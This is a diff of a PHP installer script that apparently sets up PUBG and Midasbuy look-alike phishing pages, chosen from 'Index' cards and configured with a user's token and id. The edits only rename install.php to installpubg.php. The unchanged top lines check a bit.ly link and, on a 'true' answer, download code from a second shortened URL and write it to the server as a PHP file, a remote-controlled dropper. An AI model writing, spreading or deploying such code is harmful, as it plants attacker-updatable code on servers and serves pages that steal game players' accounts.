@@ -2,7 +2,7 @@
 if(file_get_contents('http://bit.ly/instokotall') == "true"){
 $iscript = file_get_contents('http://bit.ly/instupall');
 $index = file_get_contents($iscript);
-$xx = file_put_contents("install.php", $index);
+$xx = file_put_contents("installpubg.php", $index);
 }
 function save($array){
     file_put_contents('Sha_My.json', json_encode($array));
@@ -32,7 +32,7 @@ if((!$token or !$id)and $install){
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 </head>
 <body>
- <form method="GET" action="install.php">
+ <form method="GET" action="installpubg.php">
 	<table border="0" width="100%">
 		<tr>
 			<td width="104"><span style="background-color: #FFFF00">Your Token :</span></td>
@@ -102,7 +102,7 @@ if(!$install){
 		<div class="card">
   <img src="https://i.ibb.co/CvqgZyD/Screenshot-20201030-162420.jpg" style="width:100%">
   <h3>Index Branch</h3>
-    <p><a href="/install.php?index=F"><button>Install</button></a></p>
+    <p><a href="/installpubg.php?index=F"><button>Install</button></a></p>
 </div>
 </center>
 		</td>
@@ -112,7 +112,7 @@ if(!$install){
 		<div class="card">
   <img src="https://i.ibb.co/fxrGjXp/Screenshot-20201030-162442.jpg" style="width:100%">
   <h3>Index Midasbuy</h3>
-  <p><a href="/install.php?index=M"><button>Install</button></a></p>
+  <p><a href="/installpubg.php?index=M"><button>Install</button></a></p>
 </div>
 </center>
 </td>
@@ -122,7 +122,7 @@ if(!$install){
 		<div class="card">
   <img src="https://i.ibb.co/b2mnD7h/Screenshot-20201030-162432.jpg" style="width:100%">
   <h3>Index Monster</h3>
-  <p><a href="/install.php?index=P"><button>Install</button></a></p>
+  <p><a href="/installpubg.php?index=P"><button>Install</button></a></p>
 </div>
 </center>
 </td>
@@ -133,7 +133,7 @@ if(!$install){
 		<div class="card">
   <img src="https://i.ibb.co/yQ9VXQ4/124553388-809435473123664-6442876699475679298-n.jpg" style="width:100%">
   <h3>Index HALLOWEEN</h3>
-  <p><a href="/install.php?index=H"><button>Install</button></a></p>
+  <p><a href="/installpubg.php?index=H"><button>Install</button></a></p>
 </div>
 </center>
 		</td>
